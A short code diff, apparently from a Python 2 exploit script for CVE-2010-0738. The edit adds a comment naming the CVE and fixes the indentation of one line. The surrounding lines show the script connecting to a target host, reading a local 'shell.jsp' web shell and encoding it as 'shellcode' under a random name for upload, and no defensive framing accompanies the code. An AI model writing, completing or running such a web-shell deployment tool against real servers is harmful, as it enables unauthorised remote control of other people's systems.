@@ -4,6 +4,9 @@ import urllib2
 import socket
 import time
 import random
+'''
+CVE-2010-0738
+'''
 def random_str(len): 
     str1="" 
     for i in range(len): 
@@ -38,7 +41,7 @@ class P(T):
             s1.connect((ip,int(port)))
             import os
             shell=readfile(os.path.split(os.path.realpath(__file__))[0]+'/shell.jsp')
-        #s1.recv(1024)        
+            #s1.recv(1024)
             shellcode=""
             name=random_str(5)
             for v in shell:
